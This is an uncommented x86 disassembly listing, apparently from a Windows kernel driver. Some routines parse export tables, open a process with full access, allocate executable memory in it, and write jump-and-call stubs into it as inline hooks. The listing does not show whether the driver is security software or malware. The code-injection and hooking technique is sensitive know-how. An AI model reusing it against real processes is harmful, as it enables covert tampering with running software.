   120eb:	cmp    edi,esi
   120ed:	jl     0x12111
   120ef:	mov    eax,DWORD PTR [ebp-0x4]
   120f2:	push   0x8
   120f4:	mov    DWORD PTR [ebp-0x20],eax
   120f7:	lea    eax,[ebp-0x20]
   120fa:	push   eax
   120fb:	push   0x9
   120fd:	push   DWORD PTR [ebp-0x8]
   12100:	mov    DWORD PTR [ebp-0x1c],esi
   12103:	call   0x118e4
   12108:	call   eax
   1210a:	push   DWORD PTR [ebp-0x8]
   1210d:	mov    edi,eax
   1210f:	call   ebx
   12111:	push   DWORD PTR [ebp-0x4]
   12114:	call   ebx
   12116:	push   DWORD PTR [ebp-0xc]
   12119:	call   ebx
   1211b:	push   DWORD PTR [ebp-0x10]
   1211e:	call   ebx
   12120:	pop    ebx
   12121:	mov    eax,edi
   12123:	pop    edi
   12124:	pop    esi
   12125:	leave  
   12126:	ret    0x4
   12129:	int3   
   1212a:	int3   
   1212b:	int3   
   1212c:	int3   
   1212d:	int3   
   1212e:	mov    edi,edi
   12130:	push   ebp
   12131:	mov    ebp,esp
   12133:	sub    esp,0x43c
   12139:	mov    eax,ds:0x7e528
   1213e:	xor    eax,ebp
   12140:	mov    DWORD PTR [ebp-0x4],eax
   12143:	mov    eax,DWORD PTR [ebp+0xc]
   12146:	push   ebx
   12147:	push   esi
   12148:	mov    esi,DWORD PTR [ebp+0x8]
   1214b:	push   edi
   1214c:	xor    ebx,ebx
   1214e:	push   0x3ff
   12153:	mov    DWORD PTR [ebp-0x418],eax
   12159:	lea    eax,[ebp-0x403]
   1215f:	push   ebx
   12160:	push   eax
   12161:	mov    DWORD PTR [ebp-0x424],esi
   12167:	mov    BYTE PTR [ebp-0x404],bl
   1216d:	call   0x1da92
   12172:	add    esp,0xc
   12175:	lea    eax,[ebp-0x410]
   1217b:	push   eax
   1217c:	push   0x400
   12181:	lea    eax,[ebp-0x404]
   12187:	push   eax
   12188:	push   ebx
   12189:	push   ebx
   1218a:	push   esi
   1218b:	jmp    0x1233a
   12190:	cmp    eax,ebx
   12192:	jl     0x1235c
   12198:	mov    eax,DWORD PTR [ebp-0x418]
   1219e:	lea    edx,[eax+0x2]
   121a1:	mov    cx,WORD PTR [eax]
   121a4:	inc    eax
   121a5:	inc    eax
   121a6:	cmp    cx,bx
   121a9:	jne    0x121a1
   121ab:	mov    ecx,DWORD PTR [ebp-0x3f8]
   121b1:	sub    eax,edx
   121b3:	shr    ecx,1
   121b5:	sar    eax,1
   121b7:	lea    esi,[ecx+eax*1+0x2]
   121bb:	xor    ecx,ecx
   121bd:	push   0x2
   121bf:	pop    edx
   121c0:	mov    eax,esi
   121c2:	mul    edx
   121c4:	seto   cl
   121c7:	neg    ecx
   121c9:	or     ecx,eax
   121cb:	push   ecx
   121cc:	call   0x10a52
   121d1:	mov    edi,eax
   121d3:	lea    eax,[esi+esi*1]
   121d6:	push   eax
   121d7:	push   ebx
   121d8:	push   edi
   121d9:	mov    DWORD PTR [ebp-0x40c],edi
   121df:	call   0x1da92
   121e4:	mov    eax,DWORD PTR [ebp-0x418]
   121ea:	add    esp,0x10
   121ed:	mov    ecx,eax
   121ef:	mov    dx,WORD PTR [eax]
   121f2:	inc    eax
   121f3:	inc    eax
   121f4:	cmp    dx,bx
   121f7:	jne    0x121ef
   121f9:	sub    eax,ecx
   121fb:	dec    edi
   121fc:	mov    esi,ecx
   121fe:	dec    edi
   121ff:	mov    cx,WORD PTR [edi+0x2]
   12203:	inc    edi
   12204:	inc    edi
   12205:	cmp    cx,bx
   12208:	jne    0x121ff
   1220a:	mov    ecx,eax
   1220c:	shr    ecx,0x2
   1220f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12211:	mov    ecx,eax
   12213:	and    ecx,0x3
   12216:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   12218:	mov    edi,DWORD PTR [ebp-0x40c]
   1221e:	dec    edi
   1221f:	dec    edi
   12220:	mov    ax,WORD PTR [edi+0x2]
   12224:	inc    edi
   12225:	inc    edi
   12226:	cmp    ax,bx
   12229:	jne    0x12220
   1222b:	mov    esi,0x1de2a
   12230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12231:	mov    eax,DWORD PTR [ebp-0x3f8]
   12237:	shr    eax,1
   12239:	push   eax
   1223a:	lea    eax,[ebp-0x3f4]
   12240:	push   eax
   12241:	push   DWORD PTR [ebp-0x40c]
   12247:	call   0x1da86
   1224c:	mov    esi,DWORD PTR [ebp-0x40c]
   12252:	mov    eax,esi
   12254:	add    esp,0xc
   12257:	mov    DWORD PTR [ebp-0x41c],esi
   1225d:	lea    edx,[eax+0x2]
   12260:	mov    cx,WORD PTR [eax]
   12263:	inc    eax
   12264:	inc    eax
   12265:	cmp    cx,bx
   12268:	jne    0x12260
   1226a:	sub    eax,edx
   1226c:	sar    eax,1
   1226e:	add    eax,eax
   12270:	mov    WORD PTR [ebp-0x41e],ax
   12277:	mov    WORD PTR [ebp-0x420],ax
   1227e:	lea    eax,[ebp-0x420]
   12284:	mov    DWORD PTR [ebp-0x434],eax
   1228a:	lea    eax,[ebp-0x43c]
   12290:	push   eax
   12291:	push   0xf003f
   12296:	lea    eax,[ebp-0x414]
   1229c:	push   eax
   1229d:	mov    DWORD PTR [ebp-0x43c],0x18
   122a7:	mov    DWORD PTR [ebp-0x438],ebx
   122ad:	mov    DWORD PTR [ebp-0x430],0x40
   122b7:	mov    DWORD PTR [ebp-0x42c],ebx
   122bd:	mov    DWORD PTR [ebp-0x428],ebx
   122c3:	call   0x11794
   122c8:	call   eax
   122ca:	push   esi
   122cb:	test   eax,eax
   122cd:	jl     0x12356
   122d3:	push   DWORD PTR [ebp-0x414]
   122d9:	call   0x1212e
   122de:	push   esi
   122df:	mov    BYTE PTR [ebp-0x405],al
   122e5:	call   0x1d9f8
   122ea:	pop    ecx
   122eb:	push   DWORD PTR [ebp-0x414]
   122f1:	call   0x117be
   122f6:	call   eax
   122f8:	test   eax,eax
   122fa:	jl     0x1235c
   122fc:	cmp    BYTE PTR [ebp-0x405],bl
   12302:	je     0x1235c
   12304:	push   0x3ff
   12309:	lea    eax,[ebp-0x403]
   1230f:	push   ebx
   12310:	push   eax
   12311:	mov    BYTE PTR [ebp-0x404],bl
   12317:	call   0x1da92
   1231c:	add    esp,0xc
   1231f:	lea    eax,[ebp-0x410]
   12325:	push   eax
   12326:	push   0x400
   1232b:	lea    eax,[ebp-0x404]
   12331:	push   eax
   12332:	push   ebx
   12333:	push   ebx
   12334:	push   DWORD PTR [ebp-0x424]
   1233a:	mov    DWORD PTR [ebp-0x410],ebx
   12340:	call   0x11962
   12345:	call   eax
   12347:	cmp    eax,0x8000001a
   1234c:	jne    0x12190
   12352:	mov    al,0x1
   12354:	jmp    0x1235e
   12356:	call   0x1d9f8
   1235b:	pop    ecx
   1235c:	xor    al,al
   1235e:	mov    ecx,DWORD PTR [ebp-0x4]
   12361:	pop    edi
   12362:	pop    esi
   12363:	xor    ecx,ebp
   12365:	pop    ebx
   12366:	call   0x1da15
   1236b:	leave  
   1236c:	ret    0x8
   1236f:	int3   
   12370:	int3   
   12371:	int3   
   12372:	int3   
   12373:	int3   
   12374:	mov    eax,ds:0x7ef2c
   12379:	test   eax,eax
   1237b:	je     0x1238c
   1237d:	push   eax
   1237e:	call   0x119e0
   12383:	call   eax
   12385:	and    DWORD PTR ds:0x7ef2c,0x0
   1238c:	ret    
   1238d:	int3   
   1238e:	int3   
   1238f:	int3   
   12390:	int3   
   12391:	int3   
   12392:	push   0x28
   12394:	push   0x7e048
   12399:	call   0x1dab8
   1239e:	xor    eax,eax
   123a0:	mov    DWORD PTR [ebp-0x28],eax
   123a3:	mov    DWORD PTR [ebp-0x2c],eax
   123a6:	mov    ebx,DWORD PTR [ebp+0x8]
   123a9:	cmp    ebx,eax
   123ab:	jne    0x123b4
   123ad:	xor    eax,eax
   123af:	jmp    0x12491
   123b4:	mov    DWORD PTR [ebp-0x4],eax
   123b7:	lea    ecx,[ebp-0x2c]
   123ba:	push   ecx
   123bb:	push   eax
   123bc:	push   0x1
   123be:	push   ebx
   123bf:	call   0x11890
   123c4:	call   eax
   123c6:	mov    edx,eax
   123c8:	sub    edx,ebx
   123ca:	mov    DWORD PTR [ebp-0x38],edx
   123cd:	mov    esi,DWORD PTR [eax+0x1c]
   123d0:	add    esi,ebx
   123d2:	mov    edi,DWORD PTR [eax+0x24]
   123d5:	add    edi,ebx
   123d7:	mov    ecx,DWORD PTR [eax+0x20]
   123da:	add    ecx,ebx
   123dc:	and    DWORD PTR [ebp-0x20],0x0
   123e0:	mov    ebx,DWORD PTR [ebp-0x20]
   123e3:	cmp    ebx,DWORD PTR [eax+0x18]
   123e6:	jae    0x12479
   123ec:	movsx  ebx,WORD PTR [edi+ebx*2]
   123f0:	cmp    ebx,DWORD PTR [eax+0x14]
   123f3:	jae    0x1246d
   123f5:	lea    ebx,[esi+ebx*4]
   123f8:	mov    DWORD PTR [ebp-0x34],ebx
   123fb:	cmp    DWORD PTR [ebx],edx
   123fd:	jb     0x1240b
   123ff:	mov    ebx,DWORD PTR [ebp-0x2c]
   12402:	add    edx,ebx
   12404:	mov    ebx,DWORD PTR [ebp-0x34]
   12407:	cmp    DWORD PTR [ebx],edx
   12409:	jb     0x12462
   1240b:	mov    edx,DWORD PTR [ebp+0xc]
   1240e:	mov    DWORD PTR [ebp-0x30],edx
   12411:	mov    edx,DWORD PTR [ebp-0x20]
   12414:	mov    edx,DWORD PTR [ecx+edx*4]
   12417:	add    edx,DWORD PTR [ebp+0x8]
   1241a:	mov    DWORD PTR [ebp-0x24],edx
   1241d:	mov    dl,BYTE PTR [edx]
   1241f:	mov    ebx,DWORD PTR [ebp-0x30]
   12422:	cmp    dl,BYTE PTR [ebx]
   12424:	jne    0x1244f
   12426:	test   dl,dl
   12428:	je     0x1244b
   1242a:	mov    edx,DWORD PTR [ebp-0x24]
   1242d:	mov    dl,BYTE PTR [edx+0x1]
   12430:	mov    BYTE PTR [ebp-0x19],dl
   12433:	cmp    dl,BYTE PTR [ebx+0x1]
   12436:	jne    0x1244f
   12438:	mov    edx,DWORD PTR [ebp-0x24]
   1243b:	inc    edx
   1243c:	inc    edx
   1243d:	mov    DWORD PTR [ebp-0x24],edx
   12440:	inc    ebx
   12441:	inc    ebx
   12442:	mov    DWORD PTR [ebp-0x30],ebx
   12445:	cmp    BYTE PTR [ebp-0x19],0x0
   12449:	jne    0x1241d
   1244b:	xor    edx,edx
   1244d:	jmp    0x12454
   1244f:	sbb    edx,edx
   12451:	sbb    edx,0xffffffff
   12454:	test   edx,edx
   12456:	jne    0x12462
   12458:	mov    eax,DWORD PTR [ebp-0x34]
   1245b:	mov    eax,DWORD PTR [eax]
   1245d:	add    eax,DWORD PTR [ebp+0x8]
   12460:	jmp    0x12487
   12462:	inc    DWORD PTR [ebp-0x20]
   12465:	mov    edx,DWORD PTR [ebp-0x38]
   12468:	jmp    0x123e0
   1246d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   12474:	jmp    0x123ad
   12479:	mov    eax,DWORD PTR [ebp-0x28]
   1247c:	jmp    0x1248a
   1247e:	xor    eax,eax
   12480:	inc    eax
   12481:	ret    
   12482:	mov    esp,DWORD PTR [ebp-0x18]
   12485:	xor    eax,eax
   12487:	mov    DWORD PTR [ebp-0x28],eax
   1248a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   12491:	call   0x1dafd
   12496:	ret    0x8
   12499:	int3   
   1249a:	int3   
   1249b:	int3   
   1249c:	int3   
   1249d:	int3   
   1249e:	mov    edi,edi
   124a0:	push   ebp
   124a1:	mov    ebp,esp
   124a3:	sub    esp,0x48
   124a6:	mov    eax,DWORD PTR [ebp+0xc]
   124a9:	mov    eax,DWORD PTR [eax]
   124ab:	push   edi
   124ac:	mov    DWORD PTR [ebp-0x30],eax
   124af:	lea    eax,[ebp-0x30]
   124b2:	push   eax
   124b3:	lea    eax,[ebp-0x48]
   124b6:	push   eax
   124b7:	xor    edi,edi
   124b9:	push   0x1f0fff
   124be:	lea    eax,[ebp-0x10]
   124c1:	push   eax
   124c2:	mov    DWORD PTR [ebp-0x48],0x18
   124c9:	mov    DWORD PTR [ebp-0x44],edi
   124cc:	mov    DWORD PTR [ebp-0x3c],0x200
   124d3:	mov    DWORD PTR [ebp-0x40],edi
   124d6:	mov    DWORD PTR [ebp-0x38],edi
   124d9:	mov    DWORD PTR [ebp-0x34],edi
   124dc:	mov    DWORD PTR [ebp-0x2c],edi
   124df:	mov    DWORD PTR [ebp-0x10],edi
   124e2:	call   0x1166e
   124e7:	call   eax
   124e9:	test   eax,eax
   124eb:	jl     0x1283f
   124f1:	push   ebx
   124f2:	push   esi
   124f3:	mov    esi,DWORD PTR ds:0x1ee40
   124f9:	push   0x40
   124fb:	mov    ebx,0x1000
   12500:	push   ebx
   12501:	lea    eax,[ebp-0x14]
   12504:	push   eax
   12505:	push   edi
   12506:	lea    eax,[ebp-0xc]
   12509:	push   eax
   1250a:	push   DWORD PTR [ebp-0x10]
   1250d:	mov    DWORD PTR [ebp-0xc],edi
   12510:	mov    DWORD PTR [ebp-0x14],0x400
   12517:	call   esi
   12519:	test   eax,eax
   1251b:	jl     0x12526
   1251d:	mov    eax,DWORD PTR [ebp-0xc]
   12520:	mov    ecx,DWORD PTR [ebp+0xc]
   12523:	mov    DWORD PTR [ecx+0x8],eax
   12526:	push   0x4
   12528:	push   ebx
   12529:	lea    eax,[ebp-0x14]
   1252c:	push   eax
   1252d:	push   edi
   1252e:	lea    eax,[ebp-0x18]
   12531:	push   eax
   12532:	push   DWORD PTR [ebp-0x10]
   12535:	mov    DWORD PTR [ebp-0x18],edi
   12538:	mov    DWORD PTR [ebp-0x14],0x400
   1253f:	call   esi
   12541:	test   eax,eax
   12543:	jl     0x1254e
   12545:	mov    eax,DWORD PTR [ebp-0x18]
   12548:	mov    ecx,DWORD PTR [ebp+0xc]
   1254b:	mov    DWORD PTR [ecx+0xc],eax
   1254e:	lea    eax,[ebp-0x24]
   12551:	push   eax
   12552:	push   DWORD PTR [ebp-0x30]
   12555:	call   0x11c80
   1255a:	call   eax
   1255c:	test   eax,eax
   1255e:	jl     0x1283d
   12564:	push   DWORD PTR [ebp-0x24]
   12567:	call   0x11a34
   1256c:	call   eax
   1256e:	mov    eax,DWORD PTR [ebp-0xc]
   12571:	mov    DWORD PTR [ebp-0x20],edi
   12574:	cmp    eax,edi
   12576:	je     0x12823
   1257c:	mov    esi,DWORD PTR [ebp-0x18]
   1257f:	cmp    esi,edi
   12581:	je     0x12790
   12587:	push   0x214
   1258c:	push   edi
   1258d:	push   esi
   1258e:	mov    DWORD PTR [ebp-0x4],eax
   12591:	call   0x1da92
   12596:	mov    eax,DWORD PTR [ebp-0x4]
   12599:	add    esp,0xc
   1259c:	push   0x60
   1259e:	lea    ebx,[esi+0xc]
   125a1:	push   eax
   125a2:	mov    DWORD PTR [ebx],edi
   125a4:	mov    DWORD PTR [esi],edi
   125a6:	mov    DWORD PTR [ebp-0x20],eax
   125a9:	call   0x197d0
   125ae:	push   0x68
   125b0:	push   eax
   125b1:	call   0x197d0
   125b6:	push   ebx
   125b7:	push   eax
   125b8:	call   0x197e8
   125bd:	push   0x6a
   125bf:	pop    ebx
   125c0:	push   ebx
   125c1:	push   eax
   125c2:	call   0x197d0
   125c7:	push   edi
   125c8:	push   eax
   125c9:	call   0x197d0
   125ce:	push   ebx
   125cf:	push   eax
   125d0:	call   0x197d0
   125d5:	push   edi
   125d6:	push   eax
   125d7:	call   0x197d0
   125dc:	push   0x68
   125de:	push   eax
   125df:	call   0x197d0
   125e4:	push   edi
   125e5:	push   eax
   125e6:	mov    DWORD PTR [ebp-0x28],eax
   125e9:	call   0x197e8
   125ee:	push   ebx
   125ef:	push   eax
   125f0:	call   0x197d0
   125f5:	push   edi
   125f6:	push   eax
   125f7:	call   0x197d0
   125fc:	push   ebx
   125fd:	push   eax
   125fe:	call   0x197d0
   12603:	push   edi
   12604:	push   eax
   12605:	call   0x197d0
   1260a:	push   0xb8
   1260f:	push   eax
   12610:	call   0x197d0
   12615:	push   DWORD PTR ds:0x7ef78
   1261b:	push   eax
   1261c:	call   0x197e8
   12621:	mov    ebx,0xc00b
   12626:	push   ebx
   12627:	push   eax
   12628:	call   0x19802
   1262d:	push   0x74
   1262f:	push   eax
   12630:	call   0x197d0
   12635:	push   0x9
   12637:	push   eax
   12638:	call   0x197d0
   1263d:	mov    edi,0xd0ff
   12642:	push   edi
   12643:	push   eax
   12644:	call   0x19802
   12649:	push   0xb9
   1264e:	push   eax
   1264f:	call   0x197d0
   12654:	lea    ecx,[esi+0x10]
   12657:	push   ecx
   12658:	push   eax
   12659:	call   0x197e8
   1265e:	push   0x189
   12663:	push   eax
   12664:	call   0x19802
   12669:	push   0x61
   1266b:	push   eax
   1266c:	call   0x197d0
   12671:	and    DWORD PTR [ebp-0x8],0x0
   12675:	mov    DWORD PTR [ebp-0x4],eax
   12678:	mov    eax,DWORD PTR [ebp+0x8]
   1267b:	mov    DWORD PTR [ebp-0x1c],eax
   1267e:	push   0x0
   12680:	push   DWORD PTR [ebp-0x1c]
   12683:	push   DWORD PTR [ebp-0x4]
   12686:	call   0x19f8a
   1268b:	mov    ecx,eax
   1268d:	sub    ecx,DWORD PTR [ebp-0x1c]
   12690:	mov    DWORD PTR [ebp-0x1c],eax
   12693:	add    DWORD PTR [ebp-0x8],ecx
   12696:	add    DWORD PTR [ebp-0x4],ecx
   12699:	cmp    DWORD PTR [ebp-0x8],0x5
   1269d:	jb     0x1267e
   1269f:	mov    ecx,DWORD PTR [ebp+0x8]
   126a2:	push   DWORD PTR [ebp-0x4]
   126a5:	mov    eax,DWORD PTR [ebp-0x8]
   126a8:	add    eax,ecx
   126aa:	push   eax
   126ab:	call   0x19846
   126b0:	push   eax
   126b1:	push   DWORD PTR [ebp-0x28]
   126b4:	mov    DWORD PTR [ebp-0x4],eax
   126b7:	call   0x197e8
   126bc:	mov    eax,DWORD PTR [ebp-0x4]
   126bf:	push   0xeb
   126c4:	push   eax
   126c5:	mov    DWORD PTR [esi],eax
   126c7:	call   0x197d0
   126cc:	push   0x0
   126ce:	push   eax
   126cf:	mov    DWORD PTR [esi+0x4],eax
   126d2:	call   0x197d0
   126d7:	push   0x68
   126d9:	push   eax
   126da:	call   0x197d0
   126df:	push   0x3e8
   126e4:	push   eax
   126e5:	call   0x197e8
   126ea:	push   0xb8
   126ef:	push   eax
   126f0:	call   0x197d0
   126f5:	push   DWORD PTR ds:0x7ef7c
   126fb:	push   eax
   126fc:	call   0x197e8
   12701:	push   ebx
   12702:	push   eax
   12703:	call   0x19802
   12708:	push   0x74
   1270a:	push   eax
   1270b:	call   0x197d0
   12710:	push   0x2
   12712:	push   eax
   12713:	call   0x197d0
   12718:	push   edi
   12719:	push   eax
   1271a:	call   0x19802
   1271f:	push   eax
   12720:	push   DWORD PTR [esi]
   12722:	call   0x19846
   12727:	mov    cl,al
   12729:	sub    cl,BYTE PTR [esi+0x4]
   1272c:	push   0x68
   1272e:	dec    cl
   12730:	push   eax
   12731:	mov    BYTE PTR [esi+0x8],cl
   12734:	call   0x197d0
   12739:	add    esi,0x14
   1273c:	push   esi
   1273d:	push   eax
   1273e:	call   0x197e8
   12743:	push   0xb8
   12748:	push   eax
   12749:	call   0x197d0
   1274e:	push   DWORD PTR ds:0x7ef70
   12754:	push   eax
   12755:	call   0x197e8
   1275a:	push   ebx
   1275b:	push   eax
   1275c:	call   0x19802
   12761:	push   0x74
   12763:	push   eax
   12764:	call   0x197d0
   12769:	push   0x2
   1276b:	push   eax
   1276c:	call   0x197d0
   12771:	push   edi
   12772:	push   eax
   12773:	call   0x19802
   12778:	push   0xc2
   1277d:	push   eax
   1277e:	call   0x197d0
   12783:	push   0x4
   12785:	push   eax
   12786:	call   0x19802
   1278b:	mov    eax,DWORD PTR [ebp-0xc]
   1278e:	xor    edi,edi
   12790:	cmp    eax,edi
   12792:	je     0x12823
   12798:	add    eax,0x400
   1279d:	lea    esi,[eax-0xc]
   127a0:	lea    ecx,[eax-0x8]
   127a3:	push   esi
   127a4:	lea    ebx,[eax-0x4]
   127a7:	lea    edx,[eax-0x10]
   127aa:	push   0x40
   127ac:	add    eax,0xffffffe8
   127af:	push   ecx
   127b0:	mov    DWORD PTR [ebp-0x1c],eax
   127b3:	mov    eax,DWORD PTR [ebp+0x8]
   127b6:	mov    DWORD PTR [ebx],eax
   127b8:	push   ebx
   127b9:	mov    DWORD PTR [ecx],0x5
   127bf:	push   0xffffffff
   127c1:	mov    DWORD PTR [ebp-0x8],ecx
   127c4:	mov    DWORD PTR [ebp-0x28],edx
   127c7:	mov    DWORD PTR [esi],edi
   127c9:	call   DWORD PTR ds:0x7eeec
   127cf:	test   eax,eax
   127d1:	jl     0x12823
   127d3:	mov    eax,DWORD PTR [ebp-0x20]
   127d6:	sub    eax,DWORD PTR [ebp+0x8]
   127d9:	sub    eax,0x5
   127dc:	push   eax
   127dd:	mov    eax,DWORD PTR [ebp-0x1c]
   127e0:	inc    eax
   127e1:	push   eax
   127e2:	call   0x197e8
   127e7:	push   0xe9
   127ec:	push   DWORD PTR [ebp-0x1c]
   127ef:	call   0x197d0
   127f4:	mov    eax,DWORD PTR [ebp-0x28]
   127f7:	push   eax
   127f8:	push   0x5
   127fa:	push   DWORD PTR [ebp-0x1c]
   127fd:	mov    DWORD PTR [eax],edi
   127ff:	push   DWORD PTR [ebp+0x8]
   12802:	push   0xffffffff
   12804:	call   DWORD PTR ds:0x7eee0
   1280a:	mov    eax,DWORD PTR [ebp+0xc]
   1280d:	mov    BYTE PTR [eax+0x10],0x1
   12811:	lea    eax,[ebp-0x20]
   12814:	push   eax
   12815:	push   DWORD PTR [esi]
   12817:	push   DWORD PTR [ebp-0x8]
   1281a:	push   ebx
   1281b:	push   0xffffffff
   1281d:	call   DWORD PTR ds:0x7eeec
   12823:	call   0x11a0a
   12828:	call   eax
   1282a:	call   0x11c56
   1282f:	mov    ecx,DWORD PTR [ebp-0x24]
   12832:	call   eax
   12834:	push   DWORD PTR [ebp-0x10]
   12837:	call   DWORD PTR ds:0x1ee60
   1283d:	pop    esi
   1283e:	pop    ebx
   1283f:	pop    edi
   12840:	leave  
   12841:	ret    0x8
   12844:	int3   
   12845:	int3   
   12846:	int3   
   12847:	int3   
   12848:	int3   
   12849:	int3   
   1284a:	mov    edi,edi
   1284c:	push   ebp
   1284d:	mov    ebp,esp
   1284f:	sub    esp,0x18
   12852:	and    DWORD PTR [ebp-0x18],0x0
   12856:	push   edi
   12857:	xor    eax,eax
   12859:	lea    edi,[ebp-0x14]
   1285c:	stos   DWORD PTR es:[edi],eax
   1285d:	stos   DWORD PTR es:[edi],eax
   1285e:	stos   DWORD PTR es:[edi],eax
   1285f:	stos   DWORD PTR es:[edi],eax
   12860:	lea    eax,[ebp-0x18]
   12863:	push   eax
   12864:	push   0x1
   12866:	call   0x10e72
   1286b:	pop    edi
   1286c:	test   al,al
   1286e:	je     0x128c6
   12870:	cmp    DWORD PTR [ebp-0x18],0x0
   12874:	je     0x128c6
   12876:	lea    eax,[ebp-0x4]
   12879:	push   eax
   1287a:	push   DWORD PTR [ebp-0x18]
   1287d:	call   0x11c80
   12882:	call   eax
   12884:	test   eax,eax
   12886:	jl     0x128c6
   12888:	push   esi
   12889:	push   DWORD PTR [ebp-0x4]
   1288c:	call   0x11a34
   12891:	call   eax
   12893:	mov    esi,DWORD PTR [ebp-0xc]
   12896:	mov    eax,DWORD PTR [ebp+0x8]
   12899:	lea    edx,[esi+0x14]
   1289c:	sub    edx,eax
   1289e:	movzx  ecx,WORD PTR [eax]
   128a1:	mov    WORD PTR [edx+eax*1],cx
   128a5:	inc    eax
   128a6:	inc    eax
   128a7:	test   cx,cx
   128aa:	jne    0x1289e
   128ac:	mov    eax,DWORD PTR [esi+0x4]
   128af:	mov    cl,BYTE PTR [esi+0x8]
   128b2:	mov    BYTE PTR [eax],cl
   128b4:	call   0x11a0a
   128b9:	call   eax
   128bb:	call   0x11c56
   128c0:	mov    ecx,DWORD PTR [ebp-0x4]
   128c3:	call   eax
   128c5:	pop    esi
   128c6:	leave  
   128c7:	ret    0x4
   128ca:	int3   
   128cb:	int3   
   128cc:	int3   
   128cd:	int3   
   128ce:	int3   
   128cf:	int3   
   128d0:	mov    edi,edi
   128d2:	push   ebp
   128d3:	mov    ebp,esp
   128d5:	push   ecx
   128d6:	and    DWORD PTR [ebp-0x4],0x0
   128da:	push   ebx
   128db:	push   esi
   128dc:	push   edi
   128dd:	mov    esi,0x1000
   128e2:	push   0x20736649
   128e7:	push   esi
   128e8:	push   0x0
   128ea:	call   DWORD PTR ds:0x1ee2c
   128f0:	mov    edi,eax
   128f2:	test   edi,edi
   128f4:	je     0x12928
   128f6:	lea    eax,[ebp-0x4]
   128f9:	push   eax
   128fa:	push   esi
   128fb:	push   edi
   128fc:	push   DWORD PTR [ebp+0x8]
   128ff:	call   0x1176a
   12904:	call   eax
   12906:	mov    ebx,eax
   12908:	cmp    ebx,0xc0000004
   1290e:	jne    0x1291b
   12910:	push   0x0
   12912:	push   edi
   12913:	call   DWORD PTR ds:0x1ee1c
   12919:	add    esi,esi
   1291b:	test   ebx,ebx
   1291d:	jne    0x128e2
   1291f:	mov    eax,edi
   12921:	pop    edi
   12922:	pop    esi
   12923:	pop    ebx
   12924:	leave  
   12925:	ret    0x4
   12928:	xor    eax,eax
   1292a:	jmp    0x12921
   1292c:	int3   
   1292d:	int3   
   1292e:	int3   
   1292f:	int3   
   12930:	int3   
   12931:	int3   
   12932:	push   0x0
   12934:	push   0x7eefc
   12939:	call   0x11c02
   1293e:	call   eax
   12940:	push   0x100
   12945:	push   0x0
   12947:	push   0x7e5c0
   1294c:	call   0x1da92
   12951:	add    esp,0xc
   12954:	ret    
   12955:	int3   
   12956:	int3   
   12957:	int3   
   12958:	int3   
   12959:	int3   
   1295a:	mov    edi,edi
   1295c:	push   ebp
   1295d:	mov    ebp,esp
   1295f:	push   esi
   12960:	push   DWORD PTR [ebp+0xc]
   12963:	mov    esi,ecx
   12965:	push   DWORD PTR [ebp+0x8]
   12968:	call   0x1109a
   1296d:	mov    eax,esi
   1296f:	pop    esi
   12970:	pop    ebp
   12971:	ret    0x8
   12974:	int3   
   12975:	int3   
   12976:	int3   
   12977:	int3   
   12978:	int3   
   12979:	int3   
   1297a:	mov    edi,edi
   1297c:	push   ebp
   1297d:	mov    ebp,esp
   1297f:	mov    eax,DWORD PTR [ebp+0x8]
   12982:	push   esi
   12983:	push   DWORD PTR [eax+0x4]
   12986:	mov    esi,ecx
   12988:	push   DWORD PTR [eax]
   1298a:	call   0x1109a
   1298f:	mov    eax,esi
   12991:	pop    esi
   12992:	pop    ebp
   12993:	ret    0x4
   12996:	int3   
   12997:	int3   
   12998:	int3   
   12999:	int3   
   1299a:	int3   
   1299b:	int3   
   1299c:	mov    edi,edi
   1299e:	push   ebp
   1299f:	mov    ebp,esp
   129a1:	push   ebx
   129a2:	push   esi
   129a3:	push   edi
   129a4:	mov    edi,DWORD PTR [ebp+0x8]
   129a7:	mov    eax,DWORD PTR [edi+0x4]
   129aa:	mov    esi,ecx
   129ac:	mov    ebx,DWORD PTR [esi]
   129ae:	mov    DWORD PTR [esi+0x4],eax
   129b1:	inc    eax
   129b2:	push   eax
   129b3:	call   0x10a52
   129b8:	push   DWORD PTR [esi+0x4]
   129bb:	mov    DWORD PTR [esi],eax
   129bd:	push   DWORD PTR [edi]
   129bf:	push   eax
   129c0:	call   0x1da7a
   129c5:	mov    eax,DWORD PTR [esi+0x4]
   129c8:	mov    ecx,DWORD PTR [esi]
   129ca:	push   ebx
   129cb:	mov    BYTE PTR [eax+ecx*1],0x0
   129cf:	call   0x1d9f8
   129d4:	add    esp,0x14
   129d7:	pop    edi
   129d8:	mov    eax,esi
   129da:	pop    esi
   129db:	pop    ebx
   129dc:	pop    ebp
   129dd:	ret    0x4
   129e0:	int3   
   129e1:	int3   
   129e2:	int3   
   129e3:	int3   
   129e4:	int3   
   129e5:	int3   
   129e6:	mov    edi,edi
   129e8:	push   esi
   129e9:	push   edi
   129ea:	push   0x20736649
   129ef:	push   0x20
   129f1:	push   0x0
   129f3:	mov    esi,ecx
   129f5:	call   DWORD PTR ds:0x1ee2c
   129fb:	push   0x0
   129fd:	mov    edi,eax
   129ff:	push   0x1
   12a01:	mov    ecx,esi
   12a03:	mov    DWORD PTR [esi],edi
   12a05:	call   0x110f8
   12a0a:	mov    DWORD PTR [esi+0x8],eax
   12a0d:	mov    DWORD PTR [esi+0xc],edx
   12a10:	test   edi,edi
   12a12:	jne    0x12a1f
   12a14:	push   0xc000009a
   12a19:	call   DWORD PTR ds:0x1ee14
   12a1f:	pop    edi
   12a20:	mov    eax,esi
   12a22:	pop    esi
   12a23:	ret    
   12a24:	int3   
   12a25:	int3   
   12a26:	int3   
   12a27:	int3   
   12a28:	int3   
   12a29:	int3   
   12a2a:	mov    edi,edi
   12a2c:	push   ebp
   12a2d:	mov    ebp,esp
   12a2f:	push   esi
   12a30:	push   edi
   12a31:	mov    edi,DWORD PTR [ebp+0x8]
   12a34:	push   edi
   12a35:	mov    esi,ecx
   12a37:	call   0x1299c
   12a3c:	lea    eax,[edi+0x8]
   12a3f:	push   eax
   12a40:	lea    ecx,[esi+0x8]
   12a43:	call   0x1299c
   12a48:	mov    eax,DWORD PTR [edi+0x10]
   12a4b:	mov    DWORD PTR [esi+0x10],eax
   12a4e:	lea    eax,[edi+0x14]
   12a51:	push   eax
   12a52:	lea    ecx,[esi+0x14]
   12a55:	call   0x1299c
   12a5a:	lea    eax,[edi+0x1c]
   12a5d:	push   eax
